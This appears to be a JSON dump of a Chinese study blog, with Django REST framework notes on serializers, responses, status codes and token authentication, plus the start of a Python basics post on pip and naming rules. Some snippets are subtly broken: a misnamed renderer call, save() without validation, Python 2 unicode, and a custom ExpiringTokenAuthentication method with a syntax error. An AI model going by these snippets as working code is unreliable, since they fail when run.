id=\"WEB后端服务第20天-Django第10天\"><a href=\"#WEB后端服务第20天-Django第10天\" class=\"headerlink\" title=\"WEB后端服务第20天-Django第10天\"></a>WEB后端服务第20天-Django第10天</h1><h2 id=\"一、Django-RESTful框架入门\"><a href=\"#一、Django-RESTful框架入门\" class=\"headerlink\" title=\"一、Django-RESTful框架入门\"></a>一、Django-RESTful框架入门</h2><p>文档：<a href=\"https://www.django-rest-framework.org/\">https://www.django-rest-framework.org/</a></p>\n<h3 id=\"1-1-REST概要\"><a href=\"#1-1-REST概要\" class=\"headerlink\" title=\"1.1  REST概要\"></a>1.1  REST概要</h3><p><strong>概念</strong></p>\n<p>​    REST即表述性状态传递（英文：Representational State Transfer，简称REST）是Roy Fielding博士在2000年他的博士论文中提出来的一种软件架构风格。它是一种针对网络应用的设计和开发方式，可以降低开发的复杂性，提高系统的可伸缩性。</p>\n<p>​    REST通常基于使用HTTP，URI，和XML（标准通用标记语言下的一个子集）以及HTML（标准通用标记语言下的一个应用）这些现有的广泛流行的协议和标准。RESTful API设计规范：<a href=\"http://wangwei.info/about-rest-api/\">http://wangwei.info/about-rest-api/</a></p>\n<p><strong>RESTful API四大基本原则：</strong></p>\n<ul>\n<li>为每个资源设置URI</li>\n<li>通过XML / JSON进行数据传递</li>\n<li>无状态连接，服务器端不应保存过多上下文状态，即每个请求都是独立的</li>\n<li>使用HTTP动词：GET POST PUT DELETE</li>\n</ul>\n<h3 id=\"1-2-安装包\"><a href=\"#1-2-安装包\" class=\"headerlink\" title=\"1.2 安装包\"></a>1.2 安装包</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">pip install djangorestframework markdown django-<span class=\"built_in\">filter</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"1-3-开始使用\"><a href=\"#1-3-开始使用\" class=\"headerlink\" title=\"1.3 开始使用\"></a>1.3 开始使用</h3><h4 id=\"1-3-1-创建api包，并在init-py中声明api-router对象\"><a href=\"#1-3-1-创建api包，并在init-py中声明api-router对象\" class=\"headerlink\" title=\"1.3.1 创建api包，并在init.py中声明api_router对象\"></a>1.3.1 创建api包，并在init.py中声明api_router对象</h4><h4 id=\"1-3-2-在api包下创建user-py脚本，并在脚本中声明序列化类和视图\"><a href=\"#1-3-2-在api包下创建user-py脚本，并在脚本中声明序列化类和视图\" class=\"headerlink\" title=\"1.3.2 在api包下创建user.py脚本，并在脚本中声明序列化类和视图\"></a>1.3.2 在api包下创建user.py脚本，并在脚本中声明序列化类和视图</h4><h4 id=\"1-3-3-在init-py脚本中，注册视图\"><a href=\"#1-3-3-在init-py脚本中，注册视图\" class=\"headerlink\" title=\"1.3.3 在init.py脚本中，注册视图\"></a>1.3.3 在init.py脚本中，注册视图</h4><h4 id=\"1-3-4-主urls-py配置和settings-py配置\"><a href=\"#1-3-4-主urls-py配置和settings-py配置\" class=\"headerlink\" title=\"1.3.4 主urls.py配置和settings.py配置\"></a>1.3.4 主urls.py配置和settings.py配置</h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">REST_FRAMEWORK = &#123;</span><br><span class=\"line\">\t<span class=\"string\">&#x27;DEFAULT_PAGINATION_CLASS&#x27;</span>: <span class=\"string\">&#x27;rest_framework.pagination.PageNumberPagination&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;PAGE_SIZE&#x27;</span>: <span class=\"number\">10</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"1-3-5-访问并尝试CURD操作\"><a href=\"#1-3-5-访问并尝试CURD操作\" class=\"headerlink\" title=\"1.3.5 访问并尝试CURD操作\"></a>1.3.5 访问并尝试CURD操作</h4><h2 id=\"二、数据序列化\"><a href=\"#二、数据序列化\" class=\"headerlink\" title=\"二、数据序列化\"></a>二、数据序列化</h2><p>序列化：将模型类对象转成json格式字符串的数据，并返回给前端。可以序列化一个模型类对象，也可以序列化多个模型类对象queryset(many=True)</p>\n<p>反序列化：将json数据转换成模型类对象，反序列化还可以用来进一步验证信息和保存数据，但验证的时候不一定保存数据入库，但是保存数据入库的时候一定要验证数据。</p>\n<p>序列化和反序列化的功能本质上都属于序列化器的功能。</p>\n<h3 id=\"2-1-三种序列化类\"><a href=\"#2-1-三种序列化类\" class=\"headerlink\" title=\"2.1 三种序列化类\"></a>2.1 三种序列化类</h3><ul>\n<li><p>Serializer</p>\n<ul>\n<li>声明相关的字段</li>\n<li>实现create(**validate_data)和update(instance, **validate_data)两个函数</li>\n</ul>\n</li>\n<li><p>ModelSerializer</p>\n<p>声明class的Meta类，并指定相关属性</p>\n<ul>\n<li>model</li>\n<li>fields字段列表</li>\n</ul>\n</li>\n<li><p>HyperlinkedModelSerializer</p>\n</li>\n</ul>\n<h3 id=\"2-2-序列化与反序列化\"><a href=\"#2-2-序列化与反序列化\" class=\"headerlink\" title=\"2.2 序列化与反序列化\"></a>2.2 序列化与反序列化</h3><ul>\n<li>查询模型类的数据：对象，queryset+many=True</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> api.user <span class=\"keyword\">import</span> UserSerializer</span><br><span class=\"line\"><span class=\"keyword\">from</span> user.models <span class=\"keyword\">import</span> UserModel</span><br><span class=\"line\"></span><br><span class=\"line\">s1 = UserSerializer(UserModel.objects.get(pk=<span class=\"number\">1</span>))</span><br><span class=\"line\">s2 = UserSerializer(UserModel.objects.<span class=\"built_in\">all</span>(), many=<span class=\"literal\">True</span>)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 将模型的对象转成dict或list</span></span><br><span class=\"line\">s1.data</span><br><span class=\"line\">s2.data</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>content =JSONReader().reader(serializer.data) 渲染成json数据的字符串</p>\n</li>\n<li><p>JSONParser().parse(io.BytesIO(content))对已渲染的json字符串进行反序列化</p>\n<p>可以在views视图处理函数中使用，对于POST请求对象，可以直接使用JSONParser()对象对request请求对象进行反向解析。</p>\n</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">data = JSONParser().parse(request)</span><br><span class=\"line\"></span><br><span class=\"line\">serializer = UserSerializer(data=data)</span><br><span class=\"line\">serializer.save()  <span class=\"comment\"># 将数据保存到数据库中</span></span><br></pre></td></tr></table></figure>\n\n<p>【注意】序列化类创建时常用的参数：instance、data、context、partial、many</p>\n<h3 id=\"2-3-关联关系的序列化\"><a href=\"#2-3-关联关系的序列化\" class=\"headerlink\" title=\"2.3 关联关系的序列化\"></a>2.3 关联关系的序列化</h3><ul>\n<li>serializers.StringRelatedField 获取关联模型类对象的str()返回的字符串</li>\n<li>serializers.PrimarykeyRelatedField 获取关联模型对象的pk主键id值</li>\n<li>serializers.SlugRelatedField(slug_field=’关联模型的字段’)</li>\n<li>serializers.HyperlinkedRelatedField</li>\n</ul>\n<p>如果关联的模型存在序列化类，则内嵌关联模型的序列化类。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ActiveGoodsSerializer</span>(serializers.HyperlinkedModelSerializer):</span><br><span class=\"line\">    goods = GoodsSerializer()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">class</span> <span class=\"title class_\">Meta</span>:</span><br><span class=\"line\">        model = ActiveGoodsModel</span><br><span class=\"line\">        fields = (<span class=\"string\">&#x27;goods&#x27;</span>, <span class=\"string\">&#x27;rate&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ActiveSerializer</span>(serializers.HyperlinkedModelSerializer):</span><br><span class=\"line\">    <span class=\"comment\"># activies = serializers.StringRelatedField(many=True)</span></span><br><span class=\"line\">    activies = ActiveGoodsSerializer(many=<span class=\"literal\">True</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">class</span> <span class=\"title class_\">Meta</span>:</span><br><span class=\"line\">        model = ActiveModel</span><br><span class=\"line\">        fields = (<span class=\"string\">&#x27;title&#x27;</span>, <span class=\"string\">&#x27;start_time&#x27;</span>, <span class=\"string\">&#x27;end_time&#x27;</span>, <span class=\"string\">&#x27;img1&#x27;</span>, <span class=\"string\">&#x27;activies&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"三、请求与响应\"><a href=\"#三、请求与响应\" class=\"headerlink\" title=\"三、请求与响应\"></a>三、请求与响应</h2><h3 id=\"3-1-请求对象Request\"><a href=\"#3-1-请求对象Request\" class=\"headerlink\" title=\"3.1 请求对象Request\"></a>3.1 请求对象Request</h3><p>继承HttpRequest，扩展了一部分功能，增加data属性，可以处理PUT/PATCH/POST方法的参数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">request.data  <span class=\"comment\"># request.POST</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-2-响应对象Response\"><a href=\"#3-2-响应对象Response\" class=\"headerlink\" title=\"3.2 响应对象Response\"></a>3.2 响应对象Response</h3><p>继承TemplateResponse，在创建响应对象时，提供data属性</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">return</span> Response(data)</span><br></pre></td></tr></table></figure>\n\n<p>rest_framework框架提供status模块，提供响应的信息。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">HTTP_100_CONTINUE = <span class=\"number\">100</span></span><br><span class=\"line\">HTTP_101_SWITCHING_PROTOCOLS = <span class=\"number\">101</span></span><br><span class=\"line\">HTTP_200_OK = <span class=\"number\">200</span></span><br><span class=\"line\">HTTP_201_CREATED = <span class=\"number\">201</span></span><br><span class=\"line\">HTTP_202_ACCEPTED = <span class=\"number\">202</span></span><br><span class=\"line\">HTTP_203_NON_AUTHORITATIVE_INFORMATION = <span class=\"number\">203</span></span><br><span class=\"line\">HTTP_204_NO_CONTENT = <span class=\"number\">204</span></span><br><span class=\"line\">HTTP_205_RESET_CONTENT = <span class=\"number\">205</span></span><br><span class=\"line\">HTTP_206_PARTIAL_CONTENT = <span class=\"number\">206</span></span><br><span class=\"line\">HTTP_207_MULTI_STATUS = <span class=\"number\">207</span></span><br><span class=\"line\">HTTP_208_ALREADY_REPORTED = <span class=\"number\">208</span></span><br><span class=\"line\">HTTP_226_IM_USED = <span class=\"number\">226</span></span><br><span class=\"line\">HTTP_300_MULTIPLE_CHOICES = <span class=\"number\">300</span></span><br><span class=\"line\">HTTP_301_MOVED_PERMANENTLY = <span class=\"number\">301</span></span><br><span class=\"line\">HTTP_302_FOUND = <span class=\"number\">302</span></span><br><span class=\"line\">HTTP_303_SEE_OTHER = <span class=\"number\">303</span></span><br><span class=\"line\">HTTP_304_NOT_MODIFIED = <span class=\"number\">304</span></span><br><span class=\"line\">HTTP_305_USE_PROXY = <span class=\"number\">305</span></span><br><span class=\"line\">HTTP_306_RESERVED = <span class=\"number\">306</span></span><br><span class=\"line\">HTTP_307_TEMPORARY_REDIRECT = <span class=\"number\">307</span></span><br><span class=\"line\">HTTP_308_PERMANENT_REDIRECT = <span class=\"number\">308</span></span><br><span class=\"line\">HTTP_400_BAD_REQUEST = <span class=\"number\">400</span></span><br><span class=\"line\">HTTP_401_UNAUTHORIZED = <span class=\"number\">401</span></span><br><span class=\"line\">HTTP_402_PAYMENT_REQUIRED = <span class=\"number\">402</span></span><br><span class=\"line\">HTTP_403_FORBIDDEN = <span class=\"number\">403</span></span><br><span class=\"line\">HTTP_404_NOT_FOUND = <span class=\"number\">404</span></span><br><span class=\"line\">HTTP_405_METHOD_NOT_ALLOWED = <span class=\"number\">405</span></span><br><span class=\"line\">HTTP_406_NOT_ACCEPTABLE = <span class=\"number\">406</span></span><br><span class=\"line\">HTTP_407_PROXY_AUTHENTICATION_REQUIRED = <span class=\"number\">407</span></span><br><span class=\"line\">HTTP_408_REQUEST_TIMEOUT = <span class=\"number\">408</span></span><br><span class=\"line\">HTTP_409_CONFLICT = <span class=\"number\">409</span></span><br><span class=\"line\">HTTP_410_GONE = <span class=\"number\">410</span></span><br><span class=\"line\">HTTP_411_LENGTH_REQUIRED = <span class=\"number\">411</span></span><br><span class=\"line\">HTTP_412_PRECONDITION_FAILED = <span class=\"number\">412</span></span><br><span class=\"line\">HTTP_413_REQUEST_ENTITY_TOO_LARGE = <span class=\"number\">413</span></span><br><span class=\"line\">HTTP_414_REQUEST_URI_TOO_LONG = <span class=\"number\">414</span></span><br><span class=\"line\">HTTP_415_UNSUPPORTED_MEDIA_TYPE = <span class=\"number\">415</span></span><br><span class=\"line\">HTTP_416_REQUESTED_RANGE_NOT_SATISFIABLE = <span class=\"number\">416</span></span><br><span class=\"line\">HTTP_417_EXPECTATION_FAILED = <span class=\"number\">417</span></span><br><span class=\"line\">HTTP_418_IM_A_TEAPOT = <span class=\"number\">418</span></span><br><span class=\"line\">HTTP_422_UNPROCESSABLE_ENTITY = <span class=\"number\">422</span></span><br><span class=\"line\">HTTP_423_LOCKED = <span class=\"number\">423</span></span><br><span class=\"line\">HTTP_424_FAILED_DEPENDENCY = <span class=\"number\">424</span></span><br><span class=\"line\">HTTP_426_UPGRADE_REQUIRED = <span class=\"number\">426</span></span><br><span class=\"line\">HTTP_428_PRECONDITION_REQUIRED = <span class=\"number\">428</span></span><br><span class=\"line\">HTTP_429_TOO_MANY_REQUESTS = <span class=\"number\">429</span></span><br><span class=\"line\">HTTP_431_REQUEST_HEADER_FIELDS_TOO_LARGE = <span class=\"number\">431</span></span><br><span class=\"line\">HTTP_451_UNAVAILABLE_FOR_LEGAL_REASONS = <span class=\"number\">451</span></span><br><span class=\"line\">HTTP_500_INTERNAL_SERVER_ERROR = <span class=\"number\">500</span></span><br><span class=\"line\">HTTP_501_NOT_IMPLEMENTED = <span class=\"number\">501</span></span><br><span class=\"line\">HTTP_502_BAD_GATEWAY = <span class=\"number\">502</span></span><br><span class=\"line\">HTTP_503_SERVICE_UNAVAILABLE = <span class=\"number\">503</span></span><br><span class=\"line\">HTTP_504_GATEWAY_TIMEOUT = <span class=\"number\">504</span></span><br><span class=\"line\">HTTP_505_HTTP_VERSION_NOT_SUPPORTED = <span class=\"number\">505</span></span><br><span class=\"line\">HTTP_506_VARIANT_ALSO_NEGOTIATES = <span class=\"number\">506</span></span><br><span class=\"line\">HTTP_507_INSUFFICIENT_STORAGE = <span class=\"number\">507</span></span><br><span class=\"line\">HTTP_508_LOOP_DETECTED = <span class=\"number\">508</span></span><br><span class=\"line\">HTTP_509_BANDWIDTH_LIMIT_EXCEEDED = <span class=\"number\">509</span></span><br><span class=\"line\">HTTP_510_NOT_EXTENDED = <span class=\"number\">510</span></span><br><span class=\"line\">HTTP_511_NETWORK_AUTHENTICATION_REQUIRED = <span class=\"number\">511</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"四、API授权\"><a href=\"#四、API授权\" class=\"headerlink\" title=\"四、API授权\"></a>四、API授权</h2><h3 id=\"4-1-默认授权认证\"><a href=\"#4-1-默认授权认证\" class=\"headerlink\" title=\"4.1 默认授权认证\"></a>4.1 默认授权认证</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">REST_FRAMEWORK = &#123;</span><br><span class=\"line\">\t<span class=\"string\">&#x27;DEFAULT_AUTHENTICATION_CLASSES&#x27;</span>: [</span><br><span class=\"line\">\t\t<span class=\"string\">&#x27;rest_framework.authentication.BasicAuthentication&#x27;</span>,</span><br><span class=\"line\">\t\t<span class=\"string\">&#x27;rest_framework.authentication.SessionAuthentication&#x27;</span>,</span><br><span class=\"line\">\t]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>默认情况下，APIView中的相关接口方法是不验证权限（授权）的，对资源来说不是很安全。可以通过以下的方式增加验证。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ExampleView</span>(<span class=\"title class_ inherited__\">APIView</span>):</span><br><span class=\"line\">    authentication_classes = (SessionAuthentication, BasicAuthentication)</span><br><span class=\"line\">    permission_classes = (IsAuthenticated,)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">get</span>(<span class=\"params\">self, request, <span class=\"built_in\">format</span>=<span class=\"literal\">None</span></span>):</span><br><span class=\"line\">        content = &#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;user&#x27;</span>: unicode(request.user),  <span class=\"comment\"># `django.contrib.auth.User` 实例。</span></span><br><span class=\"line\">            <span class=\"string\">&#x27;auth&#x27;</span>: unicode(request.auth),  <span class=\"comment\"># None</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> Response(content)</span><br></pre></td></tr></table></figure>\n\n<p>可以指定TokenAuthentication</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">TokenAuthentication</span>(<span class=\"title class_ inherited__\">BaseAuthentication</span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    Simple token based authentication.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Clients should authenticate by passing the token key in the &quot;Authorization&quot;</span></span><br><span class=\"line\"><span class=\"string\">    HTTP header, prepended with the string &quot;Token &quot;.  For example:</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">        Authorization: Token 401f7ac837da42b97f613d789819ff93537bee6a</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    keyword = <span class=\"string\">&#x27;Token&#x27;</span></span><br><span class=\"line\">    model = <span class=\"literal\">None</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">get_model</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> self.model <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> self.model</span><br><span class=\"line\">        <span class=\"keyword\">from</span> rest_framework.authtoken.models <span class=\"keyword\">import</span> Token</span><br><span class=\"line\">        <span class=\"keyword\">return</span> Token</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    A custom token model may be used, but must have the following properties.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    * key -- The string identifying the token</span></span><br><span class=\"line\"><span class=\"string\">    * user -- The user to which the token belongs</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">authenticate</span>(<span class=\"params\">self, request</span>):</span><br><span class=\"line\">        auth = get_authorization_header(request).split()</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> auth <span class=\"keyword\">or</span> auth[<span class=\"number\">0</span>].lower() != self.keyword.lower().encode():</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(auth) == <span class=\"number\">1</span>:</span><br><span class=\"line\">            msg = _(<span class=\"string\">&#x27;Invalid token header. No credentials provided.&#x27;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">raise</span> exceptions.AuthenticationFailed(msg)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">len</span>(auth) &gt; <span class=\"number\">2</span>:</span><br><span class=\"line\">            msg = _(<span class=\"string\">&#x27;Invalid token header. Token string should not contain spaces.&#x27;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">raise</span> exceptions.AuthenticationFailed(msg)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            token = auth[<span class=\"number\">1</span>].decode()</span><br><span class=\"line\">        <span class=\"keyword\">except</span> UnicodeError:</span><br><span class=\"line\">            msg = _(<span class=\"string\">&#x27;Invalid token header. Token string should not contain invalid characters.&#x27;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">raise</span> exceptions.AuthenticationFailed(msg)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> self.authenticate_credentials(token)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">authenticate_credentials</span>(<span class=\"params\">self, key</span>):</span><br><span class=\"line\">        model = self.get_model()</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            token = model.objects.select_related(<span class=\"string\">&#x27;user&#x27;</span>).get(key=key)</span><br><span class=\"line\">        <span class=\"keyword\">except</span> model.DoesNotExist:</span><br><span class=\"line\">            <span class=\"keyword\">raise</span> exceptions.AuthenticationFailed(_(<span class=\"string\">&#x27;Invalid token.&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> token.user.is_active:</span><br><span class=\"line\">            <span class=\"keyword\">raise</span> exceptions.AuthenticationFailed(_(<span class=\"string\">&#x27;User inactive or deleted.&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> (token.user, token)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">authenticate_header</span>(<span class=\"params\">self, request</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> self.keyword</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-2-自定义Token身份认证\"><a href=\"#4-2-自定义Token身份认证\" class=\"headerlink\" title=\"4.2 自定义Token身份认证\"></a>4.2 自定义Token身份认证</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> django.utils.translation <span class=\"keyword\">import</span> ugettext_lazy <span class=\"keyword\">as</span> _</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> rest_framework.authentication <span class=\"keyword\">import</span> BaseAuthentication</span><br><span class=\"line\"><span class=\"keyword\">from</span> rest_framework <span class=\"keyword\">import</span> exceptions</span><br><span class=\"line\"><span class=\"keyword\">from</span> rest_framework.authtoken.models <span class=\"keyword\">import</span> Token</span><br><span class=\"line\"><span class=\"keyword\">from</span> rest_framework <span class=\"keyword\">import</span> HTTP_HEADER_ENCODING</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取请求头里的token信息</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_authorization_header</span>(<span class=\"params\">request</span>):</span><br><span class=\"line\">    auth = request.META.get(<span class=\"string\">&#x27;HTTP_AUTHORIZATION&#x27;</span>, <span class=\"string\">b&#x27;&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(auth, <span class=\"built_in\">str</span>):</span><br><span class=\"line\">        <span class=\"comment\"># Work around django test client oddness</span></span><br><span class=\"line\">        auth = auth.encode(HTTP_HEADER_ENCODING)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> auth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 自定义的ExpiringTokenAuthentication认证方式</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ExpiringTokenAuthentication</span>(<span class=\"title class_ inherited__\">BaseAuthentication</span>):</span><br><span class=\"line\">    </span><br><span class=\"line\">    model = Token</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">authenticate</span>(<span class=\"params\">self, request</span>):</span><br><span class=\"line\">        auth = get_authorization_header(request):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> auth:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                token = auth.decode()</span><br><span class=\"line\">            <span class=\"keyword\">except</span> UnicodeError:</span><br><span class=\"line\">                msg = _(<span class=\"string\">&#x27;验证token无效&#x27;</span>)</span><br><span class=\"line\">                </span><br><span class=\"line\">                <span class=\"keyword\">raise</span> exceptions.AuthenticationFailed(msg)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> self.authenticate_credentials(token)</span><br></pre></td></tr></table></figure>\n","categories":["python"],"tags":["python-web"]},{"title":"python基础一","url":"/2022/08/17/python/","content":"<h1 id=\"python基础一\"><a href=\"#python基础一\" class=\"headerlink\" title=\"python基础一\"></a>python基础一</h1><ol>\n<li>面向对象：<br>类别：<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Class Water:</span><br><span class=\"line\">\tPass</span><br></pre></td></tr></table></figure>\n对象：<br>农夫山泉：具体</li>\n<li>解释型：<br>解释型和编译型：<br>编译型如C：只在编译的平台上运行<br>解释型如Python：跨平台<br>Windows —–&gt;&gt; Linux(运行)<br>开发                部署</li>\n</ol>\n<p>解释器：<br>Windows —–&gt;&gt; 软件：Python3.6，python3.7….<br>Linux —–&gt;&gt; 软件：Python3.6，python3.7….<br>Python 3.6.5 （解释器 + lib(内置库) + pip(包管理器：pip.exe)）<br>可扩展性：<br>Pip管理：增加，删除</p>\n<h2 id=\"DOS命令：\"><a href=\"#DOS命令：\" class=\"headerlink\" title=\"DOS命令：\"></a>DOS命令：</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt;python</span><br><span class=\"line\">进入python环境，写python的程序</span><br><span class=\"line\">&gt;&gt;exit() 退出环境</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;pip list 列出匹配管理的包有哪些</span><br><span class=\"line\">&gt;pip install 包名 （pip install redis）默认安装在python目录的site-packages文件夹下</span><br><span class=\"line\">&gt;pip uninstall 包名 卸载包</span><br><span class=\"line\">&gt;pip -V 查看版本</span><br><span class=\"line\">&gt;pip freeze &gt; requirements.txt 将项目依赖的包输出到指定的requirements.txt</span><br><span class=\"line\">&gt;pip install -r requirements.txt 使用pip安装requirements.txt中依赖的文件</span><br></pre></td></tr></table></figure>\n<h2 id=\"安装问题：\"><a href=\"#安装问题：\" class=\"headerlink\" title=\"安装问题：\"></a>安装问题：</h2><ol>\n<li>Runtime error 缺失程序 python — windows少了补丁</li>\n<li>python不是内部或外部命令 —<br>(1)    配置环境变量，把python.exe和pip.exe的文件路径添加到系统变量里的PATH，用分号隔开。<br>(2)    卸载重装，删除安装目录<br>(3)    升级pip:  python -m pip install –upgrade pip</li>\n</ol>\n<p>输入代码：<br>（1）进入环境：（cmd交互式）<br>终端输入：<br>Python: 写python代码<br>优点：所见即所得<br>缺点：无法保存，代码长则无法维护<br>（2）python源文件：（sublime, pycharm）<br>xxx.py 扩展名是py<br>优点：可以长期保存源程序，便于维护代码<br>如果代码长且多，则可以快速格式化<br>代码的执行顺序：从左到右，从上到下</p>\n<p>需求：输出以下内容：<br>Xxx你好：<br>请点击此链接用于激活用户：激活用户<br>单词：<br>Print() 打印<br>Defined(define) 定义<br>SyntaxError 语法错误<br>NameError 名字错误<br>    Invalid character 无效字符<br>Identifier 标识符<br>Directory 文件夹/目录<br>Built-in/ builtins 内置的<br>Raise 抛出<br>Operator 运算符<br>Identity 特点，特征<br>Sequence 序列</p>\n<p>弱类型（python）：声明的变量赋什么值就是什么类型<br>Money = 100<br>Money = 9.9<br>Money = ‘9.9元’<br>强类型（java）：<br>int money = 100<br>float money = 9.9</p>\n<h2 id=\"变量命名规则：\"><a href=\"#变量命名规则：\" class=\"headerlink\" title=\"变量命名规则：\"></a>变量命名规则：</h2><p>标识符（age=18）<br>由字母，数字，下划线组成，不能以数字开头<br>严格区分大小写<br>不能包含python的关键字<br>查看python有哪些关键字？</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt;&gt;&gt; import keyword</span><br><span class=\"line\">&gt;&gt;&gt; print(keyword.kwlist)</span><br><span class=\"line\">[&#x27;False&#x27;, &#x27;None&#x27;, &#x27;True&#x27;, &#x27;and&#x27;, &#x27;as&#x27;, &#x27;assert&#x27;, &#x27;async&#x27;, &#x27;await&#x27;, &#x27;break&#x27;, &#x27;class&#x27;, &#x27;continue&#x27;, &#x27;def&#x27;, &#x27;del&#x27;, &#x27;elif&#x27;, &#x27;else&#x27;, &#x27;except&#x27;, &#x27;finally&#x27;, &#x27;for&#x27;, &#x27;from&#x27;, &#x27;global&#x27;, &#x27;if&#x27;, &#x27;import&#x27;, &#x27;in&#x27;, &#x27;is&#x27;, &#x27;lambda&#x27;, &#x27;nonlocal&#x27;, &#x27;not&#x27;, &#x27;or&#x27;, &#x27;pass&#x27;, &#x27;raise&#x27;, &#x27;return&#x27;, &#x27;try&#x27;, &#x27;while&#x27;, &#x27;with&#x27;, 